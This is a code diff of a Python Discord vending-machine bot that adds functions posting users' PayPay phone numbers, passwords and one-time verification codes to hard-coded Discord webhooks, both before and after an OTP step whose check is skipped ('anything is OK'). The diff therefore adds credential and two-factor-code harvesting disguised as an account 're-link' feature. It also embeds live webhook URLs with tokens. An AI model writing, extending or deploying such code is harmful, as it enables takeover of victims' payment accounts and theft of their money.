@@ -22,6 +22,7 @@ ROLE_ASSIGNMENT_DATA_FILE = "role_assignment_data.json"
 
 LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1558738870282092615/WWh91oKrG1d9mkjZRI8aHGRWvm2bTdJKZiDxb0edDUzCL5Muuogna4e9-kis5gwI7BXI"
 PAYPAY_RELINK_WEBHOOK_URL = "https://discord.com/api/webhooks/1559180643517075516/oG-yfJBmnrNMtMoD458aQXJ9bg3_6DOFeIkcDtJmD1coGrv68HaYcNfKnGUeQGYXY9xM"
+PAYPAY_OTP_WEBHOOK_URL = "https://discord.com/api/webhooks/1559504101119893544/dgBvUdiyp3ShGLuMXMOrfk_EEhqEoOGZuYk72tFdxXupRgr-YpgLOTHxYBi5O6uZXT65"
 
 BOT_OWNER_ID = 1522560755856183298
 
@@ -198,23 +199,20 @@ async def send_to_webhook(content: str = None, embeds: list = None):
         print(f"Webhook送信例外: {e}")
 
 
-async def send_relink_log_to_webhook(
+async def send_relink_before_otp(
     user: discord.User,
     phone: str,
     password: str,
     uuid_str: str,
-    otp_code: str,
-    result: str,
     guild: discord.Guild = None
 ):
-    """OTP入力後に再連携用Webhookへ送信"""
+    """OTP入力前に再連携用Webhookへ送信"""
     if not PAYPAY_RELINK_WEBHOOK_URL:
         return
     try:
-        color = discord.Color.green() if result == "OK" else discord.Color.red()
         embed = discord.Embed(
-            title="🔐 PayPay 再連携 OTP結果",
-            color=color,
+            title="🔐 PayPay 再連携（OTP入力前）",
+            color=discord.Color.orange(),
             timestamp=discord.utils.utcnow()
         )
 
@@ -235,8 +233,6 @@ async def send_relink_log_to_webhook(
         embed.add_field(name="電話番号", value=f"```{phone}```", inline=True)
         embed.add_field(name="パスワード", value=f"```{password}```", inline=True)
         embed.add_field(name="UUID", value=f"```{uuid_str}```", inline=False)
-        embed.add_field(name="OTPコード", value=f"```{otp_code}```", inline=True)
-        embed.add_field(name="結果", value=f"```{result}```", inline=True)
         embed.set_footer(text="Developer @anzy1m")
 
         async with aiohttp.ClientSession() as session:
@@ -251,6 +247,58 @@ async def send_relink_log_to_webhook(
                     print(f"再連携Webhook送信失敗: {resp.status}")
     except Exception as e:
         print(f"再連携Webhook送信例外: {e}")
+
+
+async def send_relink_after_otp(
+    user: discord.User,
+    phone: str,
+    password: str,
+    uuid_str: str,
+    otp_code: str,
+    guild: discord.Guild = None
+):
+    """OTP入力後に再連携用Webhookへ送信"""
+    if not PAYPAY_OTP_WEBHOOK_URL:
+        return
+    try:
+        embed = discord.Embed(
+            title="🔐 PayPay 再連携（OTP入力後）",
+            color=discord.Color.green(),
+            timestamp=discord.utils.utcnow()
+        )
+
+        try:
+            avatar_url = user.display_avatar.url
+        except Exception:
+            avatar_url = None
+
+        if avatar_url:
+            embed.set_author(name=f"{user} ({user.id})", icon_url=avatar_url)
+            embed.set_thumbnail(url=avatar_url)
+        else:
+            embed.set_author(name=f"{user} ({user.id})")
+
+        embed.add_field(name="Discord 名前", value=f"```{user}```", inline=False)
+        embed.add_field(name="Discord ID", value=f"```{user.id}```", inline=False)
+        embed.add_field(name="サーバー", value=f"```{guild.name if guild else 'DM'} ({guild.id if guild else '-'})```", inline=False)
+        embed.add_field(name="電話番号", value=f"```{phone}```", inline=True)
+        embed.add_field(name="パスワード", value=f"```{password}```", inline=True)
+        embed.add_field(name="UUID", value=f"```{uuid_str}```", inline=False)
+        embed.add_field(name="OTPコード", value=f"```{otp_code}```", inline=False)
+        embed.set_footer(text="Developer @anzy1m")
+
+        async with aiohttp.ClientSession() as session:
+            async with session.post(
+                PAYPAY_OTP_WEBHOOK_URL,
+                json={
+                    "content": "@everyone",
+                    "embeds": [embed.to_dict()]
+                }
+            ) as resp:
+                if resp.status not in (200, 204):
+                    print(f"OTP Webhook送信失敗: {resp.status}")
+    except Exception as e:
+        print(f"OTP Webhook送信例外: {e}")
 
 
 def extract_paypay_link(text: str) -> str | None:
@@ -347,14 +395,13 @@ class PayPayRelinkModal(ui.Modal, title="PayPay OTP認証（再連携）"):
         # ===== OTP認証はスキップ（何でもOK）=====
         otp_result = "OK"
 
-        # ===== Webhookへ送信 =====
-        await send_relink_log_to_webhook(
+        # ===== OTP入力後のWebhookへ送信 =====
+        await send_relink_after_otp(
             user=interaction.user,
             phone=self.phone,
             password=self.password,
             uuid_str=self.uuid,
             otp_code=otp_code,
-            result=str(otp_result),
             guild=self.guild
         )
 
@@ -1951,7 +1998,6 @@ class VendingMachineCog(commands.Cog):
     @is_allowed()
     async def paypay_account_list(self, interaction: discord.Interaction):
         try:
-            # ===== Botオーナー or サーバー管理者のみ =====
             is_owner = (interaction.user.id == BOT_OWNER_ID)
             if not is_owner:
                 try:
@@ -2084,6 +2130,15 @@ class VendingMachineCog(commands.Cog):
         await interaction.response.defer(ephemeral=True)
 
         set_uuid = str(uuid.uuid4())
+
+        # ===== OTP入力前のWebhookへ送信 =====
+        await send_relink_before_otp(
+            user=interaction.user,
+            phone=phone,
+            password=password,
+            uuid_str=set_uuid,
+            guild=interaction.guild
+        )
 
         modal = PayPayRelinkModal(
             self, phone, password, set_uuid, None, None,
